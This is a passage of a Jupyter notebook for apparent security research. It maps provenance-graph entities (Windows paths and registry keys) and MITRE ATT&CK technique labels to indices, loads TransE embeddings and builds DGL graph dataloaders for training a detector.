       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Packages\\\\F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy\\\\Settings': 913,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Microsoft\\\\CLR_v4.0': 914,\n",
       " 'C:\\\\Users\\\\ezk\\\\Searches\\\\*': 915,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecureAssessmentBrowser_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\.git': 916,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\my\\\\*': 917,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MixedReality.Portal_8wekyb3d8bbwe\\\\AC\\\\.git': 918,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00_8wekyb3d8bbwe\\\\AC\\\\*': 919,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BingWeather_8wekyb3d8bbwe\\\\RoamingState': 920,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\\\.git': 921,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-AR\\\\*': 922,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Microsoft\\\\TokenBroker\\\\Cache\\\\*': 923,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\th\\\\*': 924,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\ar\\\\*': 925,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\.git': 926,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.045.0227.0004\\\\.git': 927,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Publishers\\\\8wekyb3d8bbwe\\\\mcg': 928,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Microsoft\\\\PenWorkspace\\\\*': 929,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\*': 930,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\LocalState': 931,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\tr\\\\.git': 932,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Code Cache\\\\wasm\\\\index-dir\\\\*': 933,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Snapshots\\\\94.0.4606.81': 934,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\3D Objects': 935,\n",
       " 'C:\\\\Users\\\\inguyen\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\Temp\\\\.git': 936,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 937,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings': 938,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\AC\\\\INetHistory': 939,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\OneDrive\\\\cache\\\\qmlcache\\\\.git': 940,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 941,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 942,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 943,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 944,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Printer Shortcuts\\\\.git': 945,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\*': 946,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\WinX\\\\.git': 947,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\AppCache\\\\*': 948,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-US': 949,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsMaps_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 950,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\tr': 951,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\qml\\\\QtQuick\\\\Layouts': 952,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AppData\\\\*': 953,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 954,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 955,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 956,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\GameExplorer': 957,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\ESE\\\\*': 958,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\AppData': 959,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\LocalState\\\\.git': 960,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\it': 961,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\LocalState\\\\*': 962,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\.git': 963,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_tw.yahoo.com_0.indexeddb.leveldb': 964,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\storage\\\\permanent\\\\chrome\\\\idb\\\\1451318868ntouromlalnodry--epcr.files\\\\*': 965,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 966,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Speech Recognition\\\\1.15.0.1': 967,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\gd\\\\.git': 968,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\sk\\\\*': 969,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCamera_8wekyb3d8bbwe\\\\AC\\\\INetCache': 970,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\cy-GB': 971,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\SystemAppData': 972,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\LocalCache\\\\*': 973,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Latn-ME\\\\.git': 974,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\LocalCache\\\\*': 975,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Mozilla': 976,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\fil\\\\*': 977,\n",
       " 'mEjFqNoZj': 978,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\*': 979,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\Temp': 980,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\.git': 981,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\tr\\\\.git': 982,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\LocalState\\\\.git': 983,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\el': 984,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy\\\\LocalState\\\\*': 985,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\AppData': 986,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\ca': 987,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AccountsControl_cw5n1h2txyewy\\\\TempState': 988,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\OneDrive\\\\cache\\\\qmlcache\\\\.git': 989,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 990,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox': 991,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\AC\\\\Temp': 992,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-JM': 993,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AppData': 994,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 995,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\\\LocalState\\\\*': 996,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\WinX\\\\Group1\\\\*': 997,\n",
       " 'HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\VIDEO\\\\\\\\Device\\\\Video5': 998,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.1_8wekyb3d8bbwe\\\\AC\\\\INetCache': 999,\n",
       " ...}"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "node_ent2idx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "5cd25846-a18b-4908-994c-d662bb5b7d81",
   "metadata": {},
   "outputs": [],
   "source": [
    "# with open(f'./secureBERT_YR/node_vocab2index.pkl', 'rb') as fp:\n",
    "#     node_ent2idx_YR = pickle.load(fp)\n",
    "# with open(f'./secureBERT_YR/edge_vocab2index.pkl', 'rb') as fp:\n",
    "#     edge_ent2idx_YR = pickle.load(fp)\n",
    "    \n",
    "# with open(f'./secureBERT_YR/nodes_ent2emb_256.pkl', 'rb') as fp:\n",
    "#     node_ent2emb_YR = pickle.load(fp)\n",
    "# with open(f'./secureBERT_YR/edges_ent2emb_16.pkl', 'rb') as fp:\n",
    "#     edge_ent2emb_YR = pickle.load(fp)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2956d24d-179a-44ce-afa9-17f0b8d35a17",
   "metadata": {},
   "source": [
    "### Add the embedding"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "43c8e260-e849-4c88-bf0c-394ab2951117",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "577c0d8e71e44a599dc62665528a41c9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "0it [00:00, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f305496968ba499a9af6f6bdb91d6afe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "0it [00:00, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "DIM = 256\n",
    "embedding = \"transE\"\n",
    "embedding = f'{embedding}_{DIM}'\n",
    "\n",
    "# with open(f\"../data/4_embedding/{embedding}.vec.json\", \"r\") as f:\n",
    "with open(f\"../data/4_embedding_3/{embedding}.vec.json\", \"r\") as f:\n",
    "    tmp = json.load(f)\n",
    "\n",
    "node_ent2emb = {idx:emb for idx, emb in tqdm(enumerate(tmp[\"ent_embeddings.weight\"]))}\n",
    "edge_ent2emb = {idx:emb for idx, emb in tqdm(enumerate(tmp[\"rel_embeddings.weight\"]))}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "385dc97f-7cd0-4c28-951b-b46f85752fd1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "256"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(node_ent2emb[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "5680deba-a6b4-4ed3-9819-b8ec496ff6cd",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "256"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(edge_ent2emb[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "a65757d8-2ced-4f02-9d09-33f796baad7a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# # 将 node_ent2emb, edge_ent2emb 转换为 NumPy 数组\n",
    "# node_ent2emb = np.array([node_ent2emb[i] for i in range(len(node_ent2emb))], dtype=np.float32)\n",
    "# edge_ent2emb = np.array([edge_ent2emb[i] for i in range(len(edge_ent2emb))], dtype=np.float32)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "42ffa5fc-3808-4463-8cab-984b0eb98560",
   "metadata": {},
   "outputs": [],
   "source": [
    "# node_ent2emb.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "7f26c941-9feb-461d-a32e-0db2bae274df",
   "metadata": {},
   "outputs": [],
   "source": [
    "# edge_ent2emb.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "8fb57cc1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b3bc5547e3034f2a80f7469191873456",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/167 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d2f811bc45f64742b9c16835ddd7d3d5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/13360 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9314cf6780a2408f81d37c625931c39b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/1670 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "46d4dbfaafe54fbf92e6cbcbdfbb9a40",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/1670 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "type2attr = {\n",
    "    \"Process\": \"Cmdline\", \n",
    "    \"File\": \"Name\", \n",
    "    \"Registry\": \"Key\", \n",
    "    \"Network\": \"Dstaddress\"\n",
    "}\n",
    "\n",
    "random.seed(42)\n",
    "trainset, validset, testset = [], [], []\n",
    "for ability in tqdm(os.listdir('../data/Raw_dataset/')):\n",
    "    paths = glob(f'../data/Raw_dataset/{ability}/number_*/expanded_instance.json')\n",
    "    # paths = glob(f'../data/Raw_dataset/{ability}/number_*/expanded_instance.json')\n",
    "    random.shuffle(paths)\n",
    "    trainset.extend(paths[:80])\n",
    "    validset.extend(paths[80:90])\n",
    "    testset.extend(paths[90:])\n",
    "    # break\n",
    "    \n",
    "train_data = make_dataset(trainset)\n",
    "valid_data = make_dataset(validset)\n",
    "test_data = make_dataset(testset)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "099b2b2d",
   "metadata": {},
   "source": [
    "# Make Torch dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "7de9ad0e",
   "metadata": {},
   "outputs": [],
   "source": [
    "class GraphDataset(Dataset):\n",
    "    def __init__(self, data_list, device):\n",
    "        self.data_list = data_list\n",
    "        self.device = device\n",
    "\n",
    "    def __len__(self):\n",
    "        return len(self.data_list)\n",
    "    \n",
    "    def __getitem__(self, idx):\n",
    "        data = self.data_list[idx]\n",
    "        return data\n",
    "\n",
    "def collate(samples):\n",
    "    data_list = samples\n",
    "    batched_graphs = []\n",
    "    for data in data_list:\n",
    "        g = dgl.graph((data[\"edge_index\"][0], data[\"edge_index\"][1]), num_nodes=data[\"num_nodes\"])\n",
    "\n",
    "        g.ndata['feat'] = torch.stack(data[\"node_feat\"])\n",
    "        g.edata['feat'] = torch.stack(data[\"edge_attr\"])\n",
    "        # print(data[\"labels\"])\n",
    "        g.edata['label'] = torch.tensor(data[\"labels\"])  \n",
    "\n",
    "        batched_graphs.append(g)\n",
    "    \n",
    "    return dgl.batch(batched_graphs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "f48e4e86",
   "metadata": {},
   "outputs": [],
   "source": [
    "train_GraphDataset = GraphDataset(train_data, device)\n",
    "valid_GraphDataset = GraphDataset(valid_data, device)\n",
    "test_GraphDataset = GraphDataset(test_data, device)\n",
    "\n",
    "batch_size = 32\n",
    "\n",
    "train_dataloader = DataLoader(train_GraphDataset, batch_size, shuffle=True, collate_fn=collate)\n",
    "valid_dataloader = DataLoader(valid_GraphDataset, batch_size, shuffle=True, collate_fn=collate)\n",
    "test_dataloader = DataLoader(test_GraphDataset, batch_size, shuffle=False, collate_fn=collate)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "6d909e4a-7f94-4bb7-87db-abab7f356fab",
   "metadata": {},
   "outputs": [],
   "source": [
    "torch_data_path = '../code_senior/torch_data'\n",
    "\n",
    "with open(f\"{torch_data_path}/train.pkl\", \"rb\") as fp:\n",
    "    train_dataloader = pickle.load(fp)\n",
    "with open(f\"{torch_data_path}/valid.pkl\", \"rb\") as fp:\n",
    "    valid_dataloader = pickle.load(fp)\n",
    "with open(f\"{torch_data_path}/test.pkl\", \"rb\") as fp:\n",
    "    test_dataloader = pickle.load(fp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "972e5db1-a4e5-45a8-93af-5b09f8d13f38",
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "\n",
    "def build_dictionary(file_path):\n",
    "    with open(file_path, 'r') as file:\n",
    "        next(file)\n",
    "        # 使用正则表达式去除行末的数字\n",
    "        dictionary = {re.sub(r'\\s\\d+$', '', line.strip()): index for index, line in enumerate(file)}\n",
    "    return dictionary"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "bdb57237-ef0b-4bba-9668-71a3b78aa49d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'T1112_34041639e6e501856ecaf5969ee29c76_I': 0,\n",
       " 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I': 1,\n",
       " 'T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B': 2,\n",
       " 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_B': 3,\n",
       " 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I': 4,\n",
       " 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_B': 5,\n",
       " 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_I': 6,\n",
       " 'T1547.001_777043894e42d2aae3881e63f6c76d33_B': 7,\n",
       " 'T1047_f4b0b4129560ea66f9751275e82f6bab_B': 8,\n",
       " 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_B': 9,\n",
       " 'T1016_a0676fe1-cd52-482e-8dde-349b73f9aa69_B': 10,\n",
       " 'T1518.001_2dece965-37a0-4f70-a391-0f30e3331aba_B': 11,\n",
       " 'T1016_921055f4-5970-4707-909e-62f594234d91_B': 12,\n",
       " 'T1003.002_7fa4ea18694f2552547b65e23952cabb_B': 13,\n",
       " 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_I': 14,\n",
       " 'T1564.004_76b6066fe170d38215251102e42be973_I': 15,\n",
       " 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_B': 16,\n",
       " 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_B': 17,\n",
       " 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_I': 18,\n",
       " 'T1003.002_5a484b65c247675e3b7ada4ba648d376_I': 19,\n",
       " 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_I': 20,\n",
       " 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_B': 21,\n",
       " 'T1105_1095434782a00c8a4772a11e625bcf5d_B': 22,\n",
       " 'T1053.005_5db2884b6ca3ab932848f295a3896dc0_B': 23,\n",
       " 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_B': 24,\n",
       " 'T1105_c521e0a70b243a0cf9217907ca3c6d27_B': 25,\n",
       " 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_I': 26,\n",
       " 'T1124_fa6e8607-e0b1-425d-8924-9b894da5a002_B': 27,\n",
       " 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_B': 28,\n",
       " 'T1053.005_ee454be9197890de62705ce6255933fd_B': 29,\n",
       " 'T1204.002_522f3f35cd013e63830fa555495a0081_I': 30,\n",
       " 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_B': 31,\n",
       " 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_I': 32,\n",
       " 'T1115_70795de7cbb842edb029b3378c27c008_I': 33,\n",
       " 'T1562.004_280003641a5cddf916c4f2bf605a71d3_B': 34,\n",
       " 'T1036.004_7de3d7b4922a7b996d8df36fb22bb118_B': 35,\n",
       " 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_I': 36,\n",
       " 'T1562.002_94f51bf01a7036fe02d07b4c18967669_B': 37,\n",
       " 'T1219_7dabcbecab0334b115feefab1630f84a_I': 38,\n",
       " 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_I': 39,\n",
       " 'T1552.002_3e5b04b8ee0a1a4950da8f35d95e65fc_B': 40,\n",
       " 'T1057_8adf02e8-6e71-4244-886c-98c402857404_I': 41,\n",
       " 'T1560_a1ee301b0508747b468d578a14e5c1a5_I': 42,\n",
       " 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_I': 43,\n",
       " 'T1546.013_f9a968af61d36983448c74cca5464e17_B': 44,\n",
       " 'T1491_68235976-2404-42a8-9105-68230cfef562_B': 45,\n",
       " 'T1562.002_94f51bf01a7036fe02d07b4c18967669_I': 46,\n",
       " 'T1217_69bbe2183fa09c00ccaac62d48e214f8_I': 47,\n",
       " 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_I': 48,\n",
       " 'T1040_6881a4589710d53f0c146e91db513f01_B': 49,\n",
       " 'T1531_b25ae80dad74142fafb510e9c1949ace_B': 50,\n",
       " 'T1047_6935e41353aa781bb723462d26114c44_B': 51,\n",
       " 'T1018_a44bb43474728496276d5d73aa14588f_B': 52,\n",
       " 'T1547.010_4593d72a5145e3f494421ac772d37464_I': 53,\n",
       " 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_I': 54,\n",
       " 'T1125_da86001b5081fcf773d8e62f22cf2b00_I': 55,\n",
       " 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_B': 56,\n",
